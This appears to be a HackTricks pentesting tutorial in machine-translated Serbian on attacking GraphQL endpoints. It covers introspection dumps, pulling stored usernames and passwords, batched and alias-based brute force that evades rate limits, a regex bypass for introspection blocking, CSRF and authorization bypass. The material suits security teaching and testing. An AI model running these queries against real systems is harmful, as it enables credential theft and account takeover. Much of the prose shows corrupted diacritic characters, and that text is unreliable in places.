# GraphQL

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Uvod

GraphQL je **istican** kao **efikasna alternativa** REST API-ju, nude캖i pojednostavljen pristup za upitivanje podataka sa backend-a. Za razliku od REST-a, koji 캜esto zahteva brojne zahteve preko razli캜itih endpoint-a za prikupljanje podataka, GraphQL omogu캖ava dobijanje svih potrebnih informacija putem **jednog zahteva**. Ovo pojednostavljenje zna캜ajno **koristi developerima** smanjuju캖i slo쬰nost njihovih procesa dobijanja podataka.

## GraphQL i Bezbednost

Sa pojavom novih tehnologija, uklju캜uju캖i GraphQL, pojavljuju se i nove bezbednosne ranjivosti. Klju캜na stvar koju treba imati na umu je da **GraphQL ne uklju캜uje mehanizme autentifikacije po default-u**. Odgovornost je programera da implementiraju takve bezbednosne mere. Bez odgovaraju캖e autentifikacije, GraphQL endpoint-i mogu otkriti osetljive informacije neautentifikovanim korisnicima, predstavljaju캖i zna캜ajan bezbednosni rizik.

### Napadi Brute Force na Direktorijume i GraphQL

Za identifikaciju izlo쬰nih GraphQL instanci, preporu캜uje se uklju캜ivanje odre캠enih putanja u napade brute force na direktorijume. Ove putanje su:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Identifikacija otvorenih GraphQL instanci omogu캖ava pregled podr쬬nih upita. To je klju캜no za razumevanje podataka dostupnih putem endpoint-a. GraphQL-ov sistem introspekcije olak코ava ovo detaljisanjem upita koje 코ema podr쬬va. Za vi코e informacija o ovome, pogledajte GraphQL dokumentaciju o introspekciji: [**GraphQL: A query language for APIs.**](https://graphql.org/learn/introspection/)

### Fingerprint

Alat [**graphw00f**](https://github.com/dolevf/graphw00f) je sposoban da otkrije koji GraphQL engine se koristi na serveru i zatim prika쬰 neke korisne informacije za bezbednosnog revizora.

#### Univerzalni upiti <a href="#universal-queries" id="universal-queries"></a>

Da biste proverili da li je URL GraphQL servis, mo쬰 se poslati **univerzalni upit**, `query{__typename}`. Ako odgovor sadr쬴 `{"data": {"__typename": "Query"}}`, potvr캠uje da URL hostuje GraphQL endpoint. Ovaj metod se oslanja na GraphQL-ovo polje `__typename`, koje otkriva tip upitanog objekta.

```javascript
query{__typename}
```

### Osnovna enumeracija

GraphQL obi캜no podr쬬va **GET**, **POST** (x-www-form-urlencoded) i **POST**(json). Iako je radi bezbednosti preporu캜ljivo dozvoliti samo json kako bi se spre캜ili CSRF napadi.

#### Introspekcija

Da biste koristili introspekciju za otkrivanje informacija o 코emi, upitajte polje `__schema`. Ovo polje je dostupno na korenskom tipu svih upita.

```bash
query={__schema{types{name,fields{name}}}}
```

Sa ovim upitom prona캖i 캖ete ime svih tipova koji se koriste:

![](<../../.gitbook/assets/image (202).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Sa ovim upitom mo쬰te izvu캖i sve tipove, njihova polja i argumente (i tip argumenata). Ovo 캖e biti vrlo korisno da biste znali kako upitati bazu podataka.

![](<../../.gitbook/assets/image (207) (3).png>)

**Gre코ke**

Interesantno je znati da li 캖e **gre코ke** biti **prikazane** jer 캖e doprineti korisnim **informacijama**.

```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```

**Enumeracija 코eme baze podataka putem introspekcije**

{% hint style="info" %}
Ako je omogu캖ena introspekcija, ali prethodni upit ne funkcioni코e, poku코ajte ukloniti direktive `onOperation`, `onFragment` i `onField` iz strukture upita.
{% endhint %}

```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```

Inline inspekcijski upit:

```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```

Poslednja linija koda je graphql upit koji 캖e izbaciti sve metainformacije iz graphql-a (imena objekata, parametri, tipovi...)

![](<../../.gitbook/assets/image (206).png>)

Ako je omogu캖ena introspekcija, mo쬰te koristiti [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) da biste videli u GUI-u sve opcije.

### Upitovanje

Sada kada znamo kakve informacije su sa캜uvane u bazi podataka, poku코ajmo **izvu캖i neke vrednosti**.

U introspekciji mo쬰te prona캖i **koji objekat mo쬰te direktno upitati** (jer ne mo쬰te upitati objekat samo zato 코to postoji). Na slede캖oj slici mo쬰te videti da se "_queryType_" zove "_Query_" i da je jedno od polja objekta "_Query_" "_flags_", koji je tako캠e tip objekta. Stoga mo쬰te upitati objekat zastave.

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

Imajte na umu da je tip upita "_flags_" "_Flags_", a ovaj objekat je definisan na slede캖i na캜in:

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

Mo쬰te videti da su objekti "_Flags_" sastavljeni od **imena** i **vrednosti**. Zatim mo쬰te dobiti sva imena i vrednosti zastava upitom:

```javascript
query={flags{name, value}}
```

Imajte na umu da u slu캜aju da je **objekat za upit** **primitivan** **tip** poput **stringa** kao u slede캖em primeru

![](<../../.gitbook/assets/image (441).png>)

Mo쬰te ga jednostavno upitati sa:

```javascript
query={hiddenFlags}
```

U jo코 jednom primeru gde su postojala 2 objekta unutar "_Query_" tipa objekta: "_user_" i "_users_".\
Ako ovi objekti ne zahtevaju nikakav argument za pretragu, mogli biste **dobiti sve informacije iz njih** samo **tra쬰캖i** podatke koje 쬰lite. U ovom primeru sa interneta mogli biste izvu캖i sa캜uvane korisni캜ke imena i lozinke:

![](<../../.gitbook/assets/image (208).png>)

Me캠utim, u ovom primeru, ako poku코ate to da uradite, dobi캖ete ovu **gre코ku**:

![](<../../.gitbook/assets/image (210).png>)

Izgleda da 캖e pretraga koristiti "_**uid**_" argument tipa _**Int**_.\
U svakom slu캜aju, ve캖 smo znali da je u odeljku [Osnovna enumeracija](graphql.md#basic-enumeration) predlo쬰n upit koji nam je pokazivao sve potrebne informacije: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Ako pro캜itate prilo쬰nu sliku kada pokrenete taj upit, vide캖ete da je "_**user**_" imao **arg** "_**uid**_" tipa _Int_.

Dakle, vr코e캖i neki lagani _**uid**_ brute force, otkrio sam da je sa _**uid**=**1**_ dobijeno korisni캜ko ime i lozinka:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

Imajte na umu da sam **otkrio** da mogu tra쬴ti **parametre** "_**user**_" i "_**password**_" jer ako poku코am da prona캠em ne코to 코to ne postoji (`query={user(uid:1){noExists}}`) dobijam ovu gre코ku:

![](<../../.gitbook/assets/image (213).png>)

I tokom faze **enumeracije** otkrio sam da je objekat "_**dbuser**_" imao polja "_**user**_" i "_**password**_.

**Triks sa ispu코tanjem upita u obliku niske (hvala @BinaryShadow\_)**

Ako mo쬰te pretra쬴vati po tipu niske, kao: `query={theusers(description: ""){username,password}}` i **tra쬴te praznu nisku**, ispu코ta캖e **sve podatke**. (_Napomena: ovaj primer nije povezan sa primerom iz tutorijala, za ovaj primer pretpostavite da mo쬰te pretra쬴vati koriste캖i "**theusers**" po polju tipa String nazvanom "**description**"_).

### Pretraga

U ovom okru쬰nju, **baza podataka** sadr쬴 **osobe** i **filmove**. **Osobe** su identifikovane svojim **emailom** i **imenom**; **filmovi** po njihovom **imenom** i **ocenom**. **Osobe** mogu biti prijatelji jedni sa drugima i tako캠e imati filmove, 코to ukazuje na odnose unutar baze podataka.

Mo쬰te **pretra쬴vati** osobe **po** imenu i dobiti njihove emaile:

```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```

Mo쬰te **pretra쬴vati** osobe **po** imenu i dobiti njihove **pretpla캖ene** **filmove**:

```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```

Obratite pa쬹ju kako je nazna캜eno da se dobije `name` od `subscribedMovies` osobe.

Tako캠e mo쬰te **pretra쬴vati vi코e objekata istovremeno**. U ovom slu캜aju, pretra쬿ju se 2 filma:

```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```

Ili 캜ak **odnosi nekoliko razli캜itih objekata kori코캖enjem aliasa**:

```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```

### Mutacije

**Mutacije se koriste za pravljenje promena na serverskoj strani.**

U **introspekciji** mo쬰te prona캖i **deklarisane** **mutacije**. Na slede캖oj slici "_MutationType_" se naziva "_Mutation_" i objekat "_Mutation_" sadr쬴 imena mutacija (kao 코to je "_addPerson_" u ovom slu캜aju):

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

U ovom postavci, **baza podataka** sadr쬴 **osobe** i **filmove**. **Osobe** su identifikovane njihovim **emailom** i **imenom**; **filmovi** po njihovom **imenom** i **ocenom**. **Osobe** mogu biti prijatelji jedni sa drugima i tako캠e imati filmove, 코to ukazuje na odnose unutar baze podataka.

Mutacija za **kreiranje novih** filmova unutar baze podataka mo쬰 izgledati ovako (u ovom primeru mutacija se zove `addMovie`):

```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```

**Obratite pa쬹ju kako su i vrednosti i tipovi podataka nazna캜eni u upitu.**

Dodatno, baza podataka podr쬬va operaciju **mutacije**, nazvanu `addPerson`, koja omogu캖ava kreiranje **osoba** zajedno sa njihovim povezivanjem sa postoje캖im **prijateljima** i **filmovima**. Va쬹o je napomenuti da prijatelji i filmovi moraju ve캖 postojati u bazi podataka pre nego 코to budu povezani sa novostvorenom osobom.

```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```

### Preoptere캖enje direktive

Kao 코to je obja코njeno u [**jednoj od ranjivosti opisanih u ovom izve코taju**](https://www.landh.tech/blog/20240304-google-hack-50000/), preoptere캖enje direktive podrazumeva poziv direktive 캜ak i milione puta kako bi server potro코io operacije dok nije mogu캖e izvr코iti DoS napad.

### Grubo silovanje u 1 API zahtevu

Ove informacije su preuzete sa [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Autentifikacija putem GraphQL API-a sa **istovremenim slanjem mnogo upita sa razli캜itim akreditacijama** kako bi se proverilo. To je klasi캜an napad grubom silom, ali sada je mogu캖e poslati vi코e od jednog para korisni캜ko ime/lozinka po HTTP zahtevu zbog mogu캖nosti grupisanja u GraphQL-u. Ovaj pristup bi prevario spoljne aplikacije za pra캖enje stope da misle da je sve u redu i da nema bota koji poku코ava da pogodi lozinke.

Ispod mo쬰te prona캖i najjednostavniju demonstraciju zahteva za autentifikaciju aplikacije, sa **3 razli캜ita para email/lozinka istovremeno**. O캜igledno je mogu캖e poslati hiljade u jednom zahtevu na isti na캜in:

![](<../../.gitbook/assets/image (182) (1).png>)

Kao 코to mo쬰mo videti sa snimka odgovora, prvi i tre캖i zahtevi vratili su _null_ i odra쬬vali odgovaraju캖e informacije u odeljku _error_. **Druga mutacija je imala ta캜ne autentifikacione** podatke i odgovor je imao ta캜an autentifikacioni sesijski token.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Bez introspekcije

Sve vi코e **graphql endpointa onemogu캖ava introspekciju**. Me캠utim, gre코ke koje graphql baca kada primi neo캜ekivan zahtev su dovoljne za alate poput [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) da rekonstrui코u ve캖i deo 코eme.

Osim toga, Burp Suite ekstenzija [**GraphQuail**](https://github.com/forcesunseen/graphquail) **prati GraphQL API zahteve koji prolaze kroz Burp** i **gradi** internu GraphQL **코emu** sa svakim novim upitom koji vidi. Tako캠e mo쬰 izlo쬴ti 코emu za GraphiQL i Voyager. Ekstenzija vra캖a la쬹i odgovor kada primi introspekcijski upit. Kao rezultat, GraphQuail prikazuje sve upite, argumente i polja dostupna za kori코캖enje unutar API-ja. Za vi코e informacija [**proverite ovo**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Lep **wordlist** za otkrivanje [**GraphQL entiteta mo쬰 se prona캖i ovde**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Zaobila쬰nje odbrana introspekcije GraphQL-a <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

### **Zaobila쬰nje Odbrana Introspekcije GraphQL-a**

Da bi se zaobi코le restrikcije na introspekcijske upite u API-ima, ubacivanje **specijalnog karaktera posle klju캜ne re캜i `__schema`** pokazuje se efikasnim. Ovaj metod iskori코캖ava uobi캜ajene propuste programera u regex obrascima koji ciljaju blokiranje introspekcije fokusiranjem na klju캜nu re캜 `__schema`. Dodavanjem karaktera poput **razmaka, novih linija i zareza**, koje GraphQL ignori코e ali mo쬯a nisu uzete u obzir u regex-u, restrikcije mogu biti zaobi캠ene. Na primer, introspekcijski upit sa novom linijom posle `__schema` mo쬰 zaobi캖i takve odbrane:

```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```

Ako ne uspete, razmotrite alternativne metode zahteva, poput **GET zahteva** ili **POST sa `x-www-form-urlencoded`**, jer se ograni캜enja mogu odnositi samo na POST zahteve.

### **Otkrivanje izlo쬰nih GraphQL struktura**

Kada je introspekcija onemogu캖ena, ispitivanje izvornog koda veb sajta radi unapred u캜itanih upita u JavaScript bibliotekama je korisna strategija. Ovi upiti mogu se prona캖i koriste캖i karticu `Sources` u alatima za razvoj, pru쬬ju캖i uvide u 코emu API-ja i otkrivaju캖i potencijalno **izlo쬰ne osetljive upite**. Komande za pretragu unutar alata za razvoj su:

```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```

## CSRF u GraphQL-u

Ako ne znate 코ta je CSRF, pro캜itajte slede캖u stranicu:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Mo쬰te prona캖i nekoliko GraphQL endpointa **konfigurisanih bez CSRF tokena.**

Imajte na umu da se GraphQL zahtevi obi캜no 코alju putem POST zahteva koriste캖i Content-Type **`application/json`**.

```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```

Me캠utim, ve캖ina GraphQL krajnjih ta캜aka tako캠e podr쬬va **`form-urlencoded` POST zahteve:**

```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```

Dakle, budu캖i da se CSRF zahtevi poput prethodnih 코alju **bez prethodnih zahteva**, mogu캖e je **izvr코iti** **promene** u GraphQL-u zloupotrebom CSRF-a.

Me캠utim, imajte na umu da je nova podrazumevana vrednost kola캜i캖a za `samesite` zastavicu u Chrome-u `Lax`. To zna캜i da 캖e kola캜i캖 biti poslat samo sa veb stranice tre캖e strane u GET zahtevima.

Imajte na umu da je obi캜no mogu캖e poslati **upit** **zahtev** tako캠e kao **GET** **zahtev i CSRF token mo쬯a ne캖e biti validiran u GET zahtevu.**

Tako캠e, zloupotrebom [**XS-Search**](../../pentesting-web/xs-search/) **napada** mogu캖e je eksfiltrirati sadr쬬j sa GraphQL endpointa zloupotrebom korisni캜kih podataka.

Za vi코e informacija **proverite** [**originalni post ovde**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Autorizacija u GraphQL-u

Mnoge GraphQL funkcije definisane na endpointu mogu proveravati samo autentifikaciju zahtevaoca, ali ne i autorizaciju.

Izmena ulaznih promenljivih upita mo쬰 dovesti do **procurivanja** osetljivih detalja naloga [leaked](https://hackerone.com/reports/792927).

Mutacija 캜ak mo쬰 dovesti do preuzimanja naloga poku코avaju캖i da se izmene podaci drugog naloga.

```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```

### Bypass autorizacije u GraphQL-u

[Povezivanje upita](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) mo쬰 zaobi캖i slab sistem autentikacije.

U donjem primeru mo쬰te videti da je operacija "forgotPassword" i da bi trebalo da izvr코i samo upit forgotPassword koji je s njim povezan. Ovo se mo쬰 zaobi캖i dodavanjem upita na kraju, u ovom slu캜aju dodajemo "register" i korisni캜ku promenljivu da bi sistem registrovao novog korisnika.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Zaobila쬰nje ograni캜enja brzine kori코캖enjem aliasa u GraphQL-u

U GraphQL-u, aliasi su mo캖na funkcija koja omogu캖ava **eksplicitno imenovanje svojstava** prilikom slanja zahteva API-ju. Ova mogu캖nost je posebno korisna za dobijanje **vi코e instanci istog tipa** objekta u jednom zahtevu. Aliasima se mo쬰 prevazi캖i ograni캜enje koje spre캜ava GraphQL objekte da imaju vi코e svojstava sa istim imenom.

Za detaljno razumevanje GraphQL aliasa, preporu캜uje se slede캖i resurs: [Alias](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Iako je primarni cilj aliasa smanjenje potrebe za brojnim API pozivima, identifikovan je neplanirani slu캜aj upotrebe gde se aliasi mogu iskoristiti za izvo캠enje napada grubom silom na GraphQL endpoint. Ovo je mogu캖e jer su neki endpointovi za코ti캖eni limitatorima brzine dizajniranim da spre캜e napade grubom silom ograni캜avanjem **broja HTTP zahteva**. Me캠utim, ovi limitatori brzine mo쬯a ne uzimaju u obzir broj operacija unutar svakog zahteva. S obzirom da aliasi omogu캖avaju uklju캜ivanje vi코e upita u jedan HTTP zahtev, mogu zaobi캖i takve mere ograni캜enja brzine.

Razmotrite donji primer, koji ilustruje kako se aliasovani upiti mogu koristiti za proveru validnosti kodova popusta u prodavnici. Ovaj metod bi mogao zaobi캖i ograni캜enje brzine jer kompajlira nekoliko upita u jedan HTTP zahtev, 코to potencijalno omogu캖ava proveru brojnih kodova popusta istovremeno.

```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```

## Alati

### Skeneri ranjivosti

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Toolkit koji se mo쬰 koristiti za dobijanje 코ema i pretragu osetljivih podataka, testiranje autorizacije, grubo pretra쬴vanje 코ema i pronala쬰nje putanja do odre캠enog tipa.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Mo쬰 se koristiti samostalno ili kao [Burp ekstenzija](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Mo쬰 se koristiti kao CLI klijent tako캠e za automatizaciju napada.
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Alat koji nabraja razli캜ite na캜ine dostizanja odre캠enog tipa u GraphQL 코emi.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Burp ekstenzija za napredno testiranje GraphQL-a. _**Scanner**_ je sr InQL v5.0, gde mo쬰te analizirati GraphQL endpoint ili lokalni introspekcijski fajl 코eme. Automatski generi코e sve mogu캖e upite i mutacije, organizuju캖i ih u strukturiran prikaz za va코u analizu. Komponenta _**Attacker**_ vam omogu캖ava pokretanje grupnih GraphQL napada, 코to mo쬰 biti korisno za zaobilazak lo코e implementiranih ograni캜enja brzine.

### Klijenti

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUI klijent
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUI klijent

### Automatski testovi

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Video koji obja코njava AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Reference

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
